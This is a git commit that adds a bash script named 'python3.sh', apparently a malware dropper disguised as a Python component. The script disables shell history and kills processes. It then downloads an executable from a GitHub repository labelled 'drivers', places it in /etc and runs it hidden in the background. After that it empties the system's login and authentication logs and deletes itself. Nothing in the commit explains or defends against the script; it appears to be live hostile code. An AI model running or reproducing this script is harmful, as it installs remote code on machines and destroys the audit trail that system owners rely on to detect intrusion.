e5bdaffdc65b26b5d52ad7004d45670c56e7191c
ConlinChow <conlinchows@gmail.com>
2024-09-21 17:43:56 +0800

    Add files via upload

---
+++ python3.sh
@@ -0,0 +1,26 @@
+#!/bin/bash
+
+set +o history
+kill -9 $(ps aux | pgrep exe)
+cd /etc
+rm -rf python3.x
+get_arch=$(uname -m)
+
+# if [[ $get_arch =~ "x86_64" ]];then
+    curl -O -fskSL https://github.com/ConlinChow/drivers/raw/main/python3.x
+    chmod +x python3.x
+    nohup ./python3.x > /dev/null 2>&1 &
+# else
+#     echo "unknown!!"
+# fi
+
+echo > /var/log/lastlog
+echo > /var/log/utmp
+echo > /var/log/wtmp
+echo > /var/log/btmp
+cat /dev/null > /var/log/secure
+cat /dev/null > /var/log/message
+cat /dev/null > /var/spool/mail/root
+cat /dev/null > /var/log/auth.log
+
+rm -rf ~/python3.sh
